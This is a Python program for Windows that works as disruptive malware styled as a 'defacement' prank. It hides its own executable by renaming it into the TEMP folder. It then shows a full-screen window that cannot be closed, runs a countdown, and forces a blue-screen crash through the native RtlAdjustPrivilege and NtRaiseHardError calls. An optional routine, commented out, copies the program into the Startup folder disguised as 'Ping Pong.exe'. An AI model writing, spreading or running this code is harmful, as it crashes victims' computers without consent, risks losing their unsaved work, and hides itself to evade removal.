import tkinter as tk
from tkinter import font as tkfont
import ctypes
import sys
import os
import shutil

def trigger_bsod():
    # Load ntdll.dll
    ntdll = ctypes.windll.ntdll

    # Define types
    BOOLEAN = ctypes.c_byte

    # RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled)
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    RtlAdjustPrivilege.argtypes = [ctypes.c_ulong, BOOLEAN, BOOLEAN, ctypes.POINTER(BOOLEAN)]
    RtlAdjustPrivilege.restype = ctypes.c_long

    # Enable SE_SHUTDOWN_PRIVILEGE (19)
    privilege = 19
    enable = BOOLEAN(True)
    current_thread = BOOLEAN(False)
    was_enabled = BOOLEAN(False)

    result = RtlAdjustPrivilege(privilege, enable, current_thread, ctypes.byref(was_enabled))
    if result != 0:
        return

    # NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    # PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response)
    NtRaiseHardError = ntdll.NtRaiseHardError
    NtRaiseHardError.argtypes = [ctypes.c_long, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    NtRaiseHardError.restype = ctypes.c_long

    # BSOD error code (STATUS_DLL_NOT_FOUND = 0xC0000135, but any fatal error works)
    error_status = 0xC0000135
    response = ctypes.c_ulong(0)
    # Parameters: error, 0 params, 0 mask, null params, option 6 (Shutdown), response pointer
    NtRaiseHardError(error_status, 0, 0, None, 6, ctypes.byref(response))

def remove_file():
    # Get the correct path depending on if it's packaged or a script
    if getattr(sys, 'frozen', False):
        file_path = sys.executable
    else:
        file_path = os.path.abspath(sys.argv[0])

    if not os.path.exists(file_path):
        return

    # Instantly hide the file by moving it to the TEMP folder
    new_path = file_path
    try:
        import tempfile, random
        temp_name = f"sys_{random.randint(1000, 9999)}.tmp"
        temp_path = os.path.join(tempfile.gettempdir(), temp_name)
        os.rename(file_path, temp_path)
        new_path = temp_path
    except Exception:
        pass

def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])

        startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        dest_name = "Ping Pong.exe.mal" # change as you like (remove .mal for auto trigger on reboot)
        dest_path = os.path.join(startup_dir, dest_name)

        shutil.copy2(exe_path, dest_path)
    except Exception as e:
        pass

def main():
    remove_file()
    window = tk.Tk()
    window.title("")
    window.configure(bg="black")
    window.attributes('-fullscreen', True)
    window.attributes('-topmost', True)
    window.protocol("WM_DELETE_WINDOW", lambda: None)
    window.overrideredirect(True)
    window.bind("<Alt-F4>", lambda e: "break")

    seconds_remaining = 10

    # Load image
    try:
        # Get the path of the image
        if getattr(sys, 'frozen', False):
            # Running as PyInstaller bundle
            base_path = sys._MEIPASS
        else:
            # Running as script
            base_path = os.path.dirname(os.path.abspath(__file__))
        
        img_path = os.path.join(base_path, "logo.png")
        img = tk.PhotoImage(file=img_path)
        img = img.subsample(3, 3)
    except Exception as e:
        img = None

    # Text
    header = "Greetings from Blue Cyber Sleuth"
    subheader = "By Fan2K"
    body_title = "Oops! looks like you got Defaced"
    body_text = "Don't worry, it will be back in {} seconds"

    # Fonts
    title_font = tkfont.Font(family="Helvetica", size=32, weight="bold")
    sub_font = tkfont.Font(family="Helvetica", size=20, weight="bold")
    body_font = tkfont.Font(family="Helvetica", size=15)

    main_frame = tk.Frame(window, bg="black")
    main_frame.pack(expand=True, fill="both", padx=40, pady=30)

    if img:
        img_label = tk.Label(main_frame, image=img, bg="black")
        img_label.image = img
        img_label.pack(pady=(0, 20))

    # Header with glow
    header_frame = tk.Frame(main_frame, bg="black")
    header_frame.pack(pady=(10, 5))

    glow_label = tk.Label(header_frame, text=header, fg="#8B0000", bg="black", font=title_font)
    glow_label.place(x=2, y=2)

    header_label = tk.Label(header_frame, text=header, fg="red", bg="black", font=title_font)
    header_label.pack()
    header_frame.update_idletasks()
    header_frame.config(width=header_label.winfo_width(), height=header_label.winfo_height())

    sub_label = tk.Label(main_frame, text=subheader, fg="red", bg="black", font=sub_font)
    sub_label.pack(pady=(0, 10))

    body_title_label = tk.Label(main_frame, text=body_title, fg="white", bg="black", font=body_font)
    body_title_label.pack(pady=(0, 10))

    body_frame = tk.Frame(main_frame, bg="black")
    body_frame.pack(expand=True, fill="both")

    body_label = tk.Label(body_frame, text=body_text.format(seconds_remaining), fg="white", bg="black", font=body_font, justify="center", anchor="n", wraplength=1)
    body_label.pack(expand=True, fill="both")

    def on_resize(event):
        new_wrap = body_frame.winfo_width() - 20
        if new_wrap > 100:
            body_label.config(wraplength=new_wrap)
    window.bind("<Configure>", on_resize)

    def countdown():
        nonlocal seconds_remaining
        if seconds_remaining > 0:
            body_label.config(text=body_text.format(seconds_remaining))
            seconds_remaining -= 1
            window.after(1000, countdown)
        else:
            # Close UI and trigger BSOD
            window.destroy()
            trigger_bsod()

    countdown()
    window.mainloop()

if __name__ == "__main__":
    # add_to_startup() # (comment this line if you don't want to add to startup)
    main()